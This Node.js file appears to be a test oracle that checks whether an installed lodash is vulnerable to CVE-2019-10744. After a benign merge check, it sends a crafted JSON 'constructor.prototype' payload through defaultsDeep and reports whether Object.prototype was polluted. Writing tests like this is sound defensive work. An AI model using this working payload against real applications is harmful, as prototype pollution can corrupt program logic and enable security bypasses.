'use strict';

function main() {
  let _;
  try {
    _ = require('lodash');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  const marker = 'oracle_' + process.pid + '_' + Date.now();

  // Benign operation: prove _.zipObjectDeep (or merge, depending on target)
  // works normally for legitimate data. We use merge for the benign check
  // since it's the API under test for the exploit as well.
  let benignOk = false;
  try {
    const target = { a: { x: 1 } };
    const result = _.merge(target, { a: { y: 2 }, b: 3 });
    benignOk = result && result.a && result.a.x === 1 && result.a.y === 2 && result.b === 3;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign merge operation failed: ' + String(e && e.message)
    }));
    return;
  }

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign merge operation produced unexpected result'
    }));
    return;
  }

  const operation_completed = true; // benign op succeeded, so setup is proven good
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Clean slate for our marker key on Object.prototype.
    delete Object.prototype[marker];

    // CVE-2019-10744: lodash.defaultsDeep (<=4.17.11) is vulnerable to
    // prototype pollution via a crafted payload using the
    // 'constructor.prototype' path (not merely a top-level '__proto__'
    // key), which bypasses the shallower guard that some later/patched
    // releases added. We build the payload via JSON.parse to emulate
    // attacker-controlled JSON input, as in the real-world exploit.
    const maliciousPayload = JSON.parse(
      '{"constructor":{"prototype":{"' + marker + '":"polluted"}}}'
    );

    _.defaultsDeep({}, maliciousPayload);

    const pollutedValue = ({}).hasOwnProperty.call(Object.prototype, marker)
      ? Object.prototype[marker]
      : undefined;

    if (pollutedValue === 'polluted') {
      exploit_succeeded = true;
      evidence = 'Object.prototype.' + marker + ' was set to "polluted" via lodash.defaultsDeep with constructor.prototype payload';
    } else {
      exploit_succeeded = false;
      evidence = 'Object.prototype.' + marker + ' was not polluted after defaultsDeep call; value=' + String(pollutedValue);
    }
  } catch (e) {
    // An exception during the malicious call, after benign success, counts as blocked.
    exploit_succeeded = false;
    evidence = 'Malicious defaultsDeep call threw (treated as blocked): ' + String(e && e.message);
  } finally {
    // Clean up any pollution we may have introduced.
    try {
      delete Object.prototype[marker];
    } catch (cleanupErr) {
      // ignore cleanup errors
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
